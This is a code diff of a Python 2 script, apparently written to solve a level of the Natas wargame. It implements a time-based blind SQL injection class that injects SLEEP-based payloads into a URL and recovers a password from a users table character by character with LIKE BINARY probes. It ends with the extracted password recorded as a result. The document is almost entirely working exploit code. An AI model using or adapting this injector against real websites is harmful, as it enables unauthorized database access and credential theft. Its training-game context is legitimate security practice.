@@ -17,15 +17,16 @@ To Do:
 
 
 
-valid_chars1 = '0123456789abcdefghijklmnopqrstuvwxyz'
-valid_chars2 = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+valid_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
 
 class SqlAttack:
 
-    def __init__(self, urlroot, sqlframe):
+    def __init__(self, urlroot, sqlframe, logging = False):
+        self.logging = logging
         self.urlroot = urlroot
         self.set_sqlframe (sqlframe)
+        self.timeframe = 'OR (SELECT SLEEP(5) FROM DUAL WHERE {})'
         if not self.testConn():
             raise Exception('Failed to connect.')
 
@@ -35,19 +36,24 @@ class SqlAttack:
     def set_sqlframe (self, frame):
         self.sqlhead, self.sqltail = frame.split('$')
 
+    def set_timeframe (self, frame):
+        self.timeframe = frame
+
     def testConn (self):
         r = self.singleReq ('OR 1=2')
         return r.status_code == requests.codes.ok
 
-    def singleReq (self, test_string):
+    def singleReq (self, test_string, timeout_val=None):
         req = self.urlroot + self.sqlhead + test_string + self.sqltail
-        #print req
-        return requests.get (req)
+        if self.logging:
+            print req
+        return requests.get (req, timeout=timeout_val)
 
     def singleTimedReq (self, test_string):
         tstart = time.time()
-        self.singleReq ('OR (SELECT SLEEP(2) FROM DUAL WHERE ' + test_string + ')')
-        if (time.time() - tstart) > 1:
+        try:
+            self.singleReq (self.timeframe.format(test_string), 1)
+        except requests.exceptions.Timeout:
             return True
         return False
 
@@ -64,31 +70,35 @@ class SqlAttack:
 
     def calcItemChars (self, item_name):
         used_chars = ''
-        for c in valid_chars1:
-            if self.singleTimedReq (item_name + ' LIKE "%' + c + '%"'):
+        for c in valid_chars:
+            sys.stdout.write (c)
+            sys.stdout.flush()
+            if self.singleTimedReq (item_name + ' LIKE BINARY "%' + c + '%"'):
                 used_chars += c
-                sys.stdout.write (c)
+            else:
+                sys.stdout.write ("\033[1D")
                 sys.stdout.flush()
-        print ""
+        print " "
         return used_chars
 
-    def calcItemValue (self, item_name, len, chars):
-        value = ''
-        #other_chars = "_" * (len - 1)
-        for n in range (len):
+    def calcItemValue (self, item_name, max_len, chars, value = ''):
+        sys.stdout.write (value)
+        sys.stdout.flush()
+        for n in range (len(value),max_len):
             for c in chars:
+                sys.stdout.write (c)
+                sys.stdout.flush()
                 if self.singleTimedReq (item_name + ' LIKE BINARY "' + value + c + '%"'):
                     value += c
-                    #other_chars = other_chars[:-1]
-                    sys.stdout.write (c)
-                    sys.stdout.flush()
                     break
-        print ""
+
+                sys.stdout.write ("\033[1D")
+                sys.stdout.flush()
+
         return value
 
     def checkItemValue (self, query_string, value):
         return self.singleTimedReq (query_string + " = '" + value + "'")
-
 
     @staticmethod
     def getDatabaseQuery():
@@ -105,7 +115,6 @@ class SqlAttack:
     @staticmethod
     def getRecordQuery (table_name, column_wanted, column_name, column_value):
         return "(select " + column_wanted + " from " + table_name + " where " + column_name + "='" + column_value + "')"
-
 
     def fullQuery (self, query_string):
         if self.checkItemExists (query_string):
@@ -135,23 +144,24 @@ print 'STARTING....'
 
 print 'Initial test.'
 
-attack = SqlAttack (target_url + url_params, '" $; -- ')
-#attack.fullQuery (SqlAttack.getDatabaseQuery())
-#attack.fullQuery (SqlAttack.getTableWithColumnQuery('pass'))
-#attack.fullQuery (SqlAttack.getColumnQuery('users', 'user'))
-#attack.fullQuery (SqlAttack.getRecordQuery ('users', 'password', 'username', 'natas18'))
-attack.calcItemValue (SqlAttack.getRecordQuery ('users', 'password', 'username', 'natas18'), 32, '047cdfghijklmopqrsvwxy')
+try:
+    attack = SqlAttack (target_url + url_params, '" $; -- ', False)
+    #attack.fullQuery (SqlAttack.getDatabaseQuery())
+    #attack.fullQuery (SqlAttack.getTableWithColumnQuery('pass'))
+    #attack.fullQuery (SqlAttack.getColumnQuery('users', 'user'))
+    #attack.fullQuery (SqlAttack.getRecordQuery ('users', 'password', 'username', 'natas18'))
+    #print attack.calcItemLen (SqlAttack.getRecordQuery ('users', 'password', 'username', 'natas18'))
+    attack.sqlhead = ""
+    attack.sqltail = ""
+    attack.timeframe = 'natas18" AND IF({}, SLEEP(10), NULL) %23'
 
+    known_chars = ''
+    vchars = '047dghjlmpqsvwxyCDFIKOPR'
+    #vchars = attack.calcItemChars ('password')
+    print attack.calcItemValue ('password', 32, vchars, known_chars)
+    #print attack.calcItemValue (SqlAttack.getRecordQuery ('users', 'password', 'username', 'natas18'), 32, '047cdghjlmpqsvwxyCDFIKOPR', "xvKIqDjy4OPv7w")
+    #xvKIqD7dyD
+except KeyboardInterrupt as e:
+    print "\nProgram Terminated by User"
 
-'''
-dbQuery = SqlAttack.getDatabaseQuery()
-
-len = attack.calcItemLen (dbQuery)
-print "Length = ", len
-chars = attack.calcItemChars (dbQuery)
-print "Characters = ", chars
-value = attack.calcItemValue (dbQuery, len, chars)
-print "Value = ", value
-correct = attack.checkItemValue (dbQuery, value)
-print "Correct Value = ", correct
-'''
+## RESULT = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
